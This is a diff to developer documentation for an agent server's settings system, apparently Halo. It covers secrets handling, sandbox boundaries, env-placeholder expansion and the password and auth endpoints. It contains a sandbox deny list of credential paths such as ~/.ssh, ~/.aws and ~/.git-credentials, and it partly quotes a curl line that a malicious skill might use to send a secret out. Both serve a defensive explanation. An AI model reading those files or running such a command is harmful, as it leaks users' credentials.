@@ -17,8 +17,8 @@ general:                                  # built-in declarer (server itself)
     max_summary_input: 15000
     ...
   sandbox:
-    hidden_dirs: "~/.halo/secrets,~/.aws,~/.ssh,~/.gnupg,~/.docker,~/.config/gh"
-    hidden_files: "~/.npmrc,~/.bash_history,~/.gitconfig,~/.git-credentials,~/.netrc,~/.halo/global/runs.db"
+    hidden_dirs: "~/.halo/secrets,~/.aws,~/.ssh,~/.gnupg,~/.docker,~/.config/gh,~/.halo/global/internal-sessions,~/.halo/global/logs"
+    hidden_files: "~/.npmrc,~/.bash_history,~/.gitconfig,~/.git-credentials,~/.netrc,~/.halo/global/evo.db,~/.halo/global/evo.db-wal,~/.halo/global/evo.db-shm,~/.halo/global/cron.db,~/.halo/global/cron.db-wal,~/.halo/global/cron.db-shm,~/.halo/global/runs.db,~/.halo/global/runs.db-wal,~/.halo/global/runs.db-shm"
     writable_dirs: ""                     # e.g. ~/.kiro,~/.local/share/kiro-cli — rw bind-mounts in bwrap; ignored for readonly sessions
   logging:
     level: warn
@@ -36,13 +36,13 @@ deepseek:
   secrets:
     api_key: <<DEEPSEEK_API_KEY>>
 
-tavily-search:                            # skill id from skills/<id>/config.yaml
+tavily-web-search:                        # skill id from skills/<id>/config.yaml
   params:
     api_key: <<TAVILY_API_KEY>>
 ```
 
 The path always reads as `<namespace-id>.<kind>s.<key>`:
-- `<namespace-id>` is `general`, a provider id, or a skill id
+- `<namespace-id>` is `general`, a provider id, a skill id, or an agent id
 - `<kind>` is `param` or `secret`
 - `<key>` is the leaf, dotted for grouping (e.g. `general.compact.keep_messages`)
 
@@ -91,15 +91,17 @@ params:
 secrets: []
 ```
 
+Global agents declare theirs the same way in `agents/<agent-id>/agent-config.yaml` (same `params:` / `secrets:` lists; shown under Settings → Agents).
+
 ### General — built-in
 
-Declared in [packages/server/src/settings-schema.ts](../../../packages/server/src/settings-schema.ts) `generalSection()`. The server itself is the implicit declarer. Keys: `language`, `agent.*`, `server.*`, `session.*`, `compact.*`, `sandbox.*`, `logging.*`, `evolution.*`, `limits.*`. All `general.*` keys are `globalOnly`: `config.ts` resolves them through `settingsValue()` against `~/.halo/secrets/settings.yaml` only, so a workspace `settings.yaml` cannot override them. Per-workspace layering applies to namespaced `params` / `secrets` (`getServerSecret(ns, key, workspaceRoot)`, `substituteSecrets`).
+Declared in [packages/server/src/settings-schema.ts](../../../packages/server/src/settings-schema.ts) `generalSection()`. The server itself is the implicit declarer. Keys: `language`, `theme`, `agent.*`, `server.*`, `session.*`, `compact.*`, `sandbox.*`, `logging.*`, `observability.*` (read once at boot — restart to apply), `evolution.*`, `limits.*`. All `general.*` keys are `globalOnly`: `config.ts` resolves them through `settingsValue()` against `~/.halo/secrets/settings.yaml` only, so a workspace `settings.yaml` cannot override them. Per-workspace layering applies to namespaced `params` / `secrets` (`getServerSecret(ns, key, workspaceRoot)`, `substituteSecrets`).
 
 `server.trust_proxy` (boolean, default `false`, `globalOnly`): whether the brute-force rate limiter (`middleware/brute-force.ts` `getClientIp`) trusts the `x-forwarded-for` header for client IP resolution. Direct-connect deployments leave it `false` and get the socket address. Behind a reverse proxy (nginx / Cloudflare / etc.), set it to `true` so the real client IP is honored instead of the proxy's — but only when that proxy is one you control and rewrites the header itself, otherwise a client can forge XFF to dodge lockouts.
 
 `sandbox.hidden_dirs` / `sandbox.hidden_files` / `sandbox.writable_dirs` are `globalOnly` — they define the security boundary agents run inside, so a workspace `settings.yaml` cannot override them (a workspace overriding them could lift its own sandbox constraints).
 
-`evolution.*` controls the self-evolution subsystem (see [plans/self-evolution.md](../plans/self-evolution.md)). All `evolution.*` keys are `globalOnly` — they live in `~/.halo/secrets/settings.yaml` only, not workspace settings. Notable knobs: `evolution.level` (`L0` = off, `L1` = human + LLM assist), `evolution.max_concurrent_run` / `max_concurrent_apply` (wrapper concurrency caps), `evolution.run_timeout_minutes` / `apply_timeout_minutes` (heartbeat timeouts), `evolution.max_attempts` (per-row retry cap), `evolution.triggers.pre_compact` (snapshot session before compaction).
+`evolution.*` controls the self-evolution subsystem (see [design/evolution.md](../design/evolution.md)). All `evolution.*` keys are `globalOnly` — they live in `~/.halo/secrets/settings.yaml` only, not workspace settings. Notable knobs: `evolution.level` (`L0` = manual only: `/evo` drafts, a reviewer approves; `L1` = L0 plus automatic drafting on pre-compact), `evolution.max_concurrent_run` / `max_concurrent_apply` (wrapper concurrency caps), `evolution.run_timeout_minutes` / `apply_timeout_minutes` (heartbeat timeouts), `evolution.max_attempts` (per-row retry cap), `evolution.triggers.pre_compact` (snapshot session before compaction).
 
 Goal mode's entry points are offline (the `/goal` command, admin banner and creation of new goal sessions are hidden). To reopen them, set `general.goal_mode_enabled` — a global-only boolean, default `false`, read from `~/.halo/secrets/settings.yaml` only (a workspace `settings.yaml` has no effect) and not shown in the Settings UI — then restart the Halo server and refresh the browser (existing goal bindings and history are not touched either way):
 
@@ -117,11 +119,13 @@ The value is read once at process start, so unlike other settings it is **not** 
 | Attribute | Required | Purpose |
 |---|---|---|
 | `key` | yes | Leaf key under the namespace |
+| `type` | no | `string` (default) / `int` / `float` / `boolean` / `enum` — picks the input widget |
+| `options` / `optionLabels` | no | For `type: enum`: the allowed values, and optional display labels parallel to them |
 | `description` | no | English description rendered as help text |
 | `description_zh` | no | Chinese description (UI picks based on lang) |
 | `default` | no | Placeholder shown when the value is unset; supports `<<ENV>>` |
 | `secret` | no | `true` → masked in API responses + password input in UI |
-| `globalOnly` | no | `true` → read from global settings only; workspace overrides are ignored at runtime. UI disables the workspace input and shows a "global only" hint |
+| `globalOnly` | no | `true` → read from global settings only; workspace overrides are ignored at runtime. UI disables the workspace input and shows a "global only" hint; `PUT` / `PATCH` of such a key at workspace scope is rejected with 400. Set by the built-in `general` section only — provider / skill / agent yaml declarations don't read it |
 
 ## Scope: global vs. workspace
 
@@ -133,7 +137,8 @@ The value is read once at process start, so unlike other settings it is **not** 
 Read order: `<schema default> <- <global> <- <workspace>` (workspace layer applies to namespaced `params` / `secrets` only — see General above).
 
 The Settings page shows source badges per field:
-- `workspace` (green-blue, override applied here)
+- `workspace` (blue, override applied here)
+- `global` (green, value set at the global layer)
 - `inherited from global` (grey, value pulled from global because workspace has none)
 - `unset` (no value at any layer; the `default` is shown as placeholder)
 
@@ -147,7 +152,7 @@ Values can carry `<<ENV_NAME>>` placeholders. They're expanded:
 
 **Trust boundary**: `<<ENV>>` is only expanded inside settings-resolved values. Raw cmd text the agent writes is not scanned — `shell_exec "echo <<HOME>>"` keeps the literal. This prevents an agent from naming an env var and forcing the server to dump it.
 
-Env var unset → the `<<ENV_NAME>>` literal stays verbatim, plus `[md-vars] Env var "X" not set — keeping <<X>> literal` in the server log. The Settings UI returns the literal too — the browser never sees the real env value.
+Env var unset → the `<<ENV_NAME>>` literal stays verbatim, plus `[MdVars] Env var "X" not set — keeping <<X>> literal` in the server log. The Settings UI returns the literal too — the browser never sees the real env value.
 
 ## Agent visibility
 
@@ -169,7 +174,7 @@ A malicious skill that tries `curl -H "Bearer {{aws-bedrock-claude-invoke.secret
 
 ## Orphans
 
-Values present in `settings.yaml` whose namespace doesn't appear in any current schema declaration are surfaced as **orphans** in a dedicated tab. They aren't deleted automatically — uninstalling a skill keeps its values around so re-installing pops them back in. Users prune them on their own schedule via the orphan tab's per-key Remove buttons.
+`params` / `secrets` values present in `settings.yaml` that no current schema declaration covers (the whole namespace is gone, or just that key) are surfaced as **orphans** in a dedicated tab. They aren't deleted automatically — uninstalling a skill keeps its values around so re-installing pops them back in. Users prune them on their own schedule via the orphan tab's per-key Remove buttons.
 
 `general.*` is intentionally excluded from orphan detection — its declared keys are enumerated by the built-in schema, so anything else there is treated as either a typo or a forward-compat field, not an orphan.
 
@@ -177,7 +182,7 @@ Values present in `settings.yaml` whose namespace doesn't appear in any current 
 
 A **Security** entry in the left nav (below the System group) opens a page with two cards. Like `__orphans` it's a synthetic nav target, not a schema section — the credential lives in `~/.halo/secrets/config.yaml` (`server.password`, scrypt hash), not `settings.yaml`, and the header shows that path accordingly.
 
-**Change password** — three inputs: current password, new password, confirm. Live client-side feedback while typing: strength rule (≥8 chars, at least one letter and one digit), new ≠ current, confirm matches; the submit button stays disabled until all pass. Submit posts to `POST /api/auth/change-password` (see [dev/api.md](../dev/api.md)) — the server re-runs the same checks authoritatively; a server rejection is shown verbatim under the form. Success shows an inline confirmation and clears all three fields. Existing sessions stay signed in (`jwt_secret` is not rotated). Forgotten password (can't provide the current one) is out of scope here — that's `halo setup`'s reset path.
+**Change password** — three inputs: current password, new password, confirm. Live client-side feedback while typing: strength rule (≥8 chars, at least one letter and one digit), new ≠ current, confirm matches; the submit button stays disabled until all pass. Submit posts to `POST /api/auth/change-password` (see [dev/api.md](../dev/api.md)) — the server re-runs the same checks authoritatively; a server rejection is shown verbatim under the form. Success shows an inline confirmation and clears all three fields. When the password is supplied by the `HALO_PASSWORD` env var the endpoint refuses with 400, since the stored hash is not what login checks. Existing sessions stay signed in (`jwt_secret` is not rotated). Forgotten password (can't provide the current one) is out of scope here — that's `halo setup`'s reset path.
 
 **Log out** — the login state is an httpOnly JWT cookie, so JS can't clear it directly: the button calls `POST /api/auth/logout` (server expires the cookie via Set-Cookie) and reloads; the boot auth check then lands on the login page. This browser only — no server-side token blacklist.
 
@@ -185,7 +190,6 @@ A **Security** entry in the left nav (below the System group) opens a page with 
 
 | Operation | Method | Endpoint | Purpose |
 |---|---|---|---|
-| Read merged settings (legacy) | GET | `/api/settings?projectId=xxx` | Raw read, used by older tooling |
 | Read schema + resolved values | GET | `/api/settings/schema?projectId=xxx` | Drives the new Settings page |
 | Replace scope | PUT | `/api/settings` | Bulk replace one yaml file |
 | Patch single key | PATCH | `/api/settings` | Set a leaf at `<dotted-key>` |
@@ -208,7 +212,7 @@ A **Security** entry in the left nav (below the System group) opens a page with 
           "kind": "secret",
           "description": "AWS Access Key ID",
           "description_zh": "...",
-          "default": null,
+          "default": "...",                        // omitted when the schema declares none
           "secret": true,
           "value": "AK****ST",
           "hasValue": true,
